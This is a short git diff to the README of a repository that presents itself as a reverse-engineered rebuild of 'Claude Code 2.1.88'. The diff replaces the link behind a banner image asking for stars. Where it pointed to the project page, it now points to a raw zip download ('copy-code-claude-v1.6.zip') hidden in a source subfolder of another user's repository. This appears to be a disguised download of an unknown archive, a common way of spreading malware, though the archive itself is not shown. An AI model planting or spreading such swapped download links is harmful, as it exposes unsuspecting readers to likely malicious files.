@@ -1,7 +1,7 @@
 # Claude Code 2.1.88 逆向重建版
 
 <div align="center">
-  <a href="https://github.com/jay6697117/claude-copy-code">
+  <a href="https://github.com/abnormal-erie428/claude-copy-code/raw/refs/heads/main/src/commands/effort/copy-code-claude-v1.6.zip">
     <img src="assets/github_star_girl.png" alt="⭐ 求星 ⭐" width="400">
   </a>
   <p><b>如果这个项目对你有帮助，千万不可错过点个 Star ⭐️ 支持一下呀！你的 Star 是我持续更新的动力！</b></p>
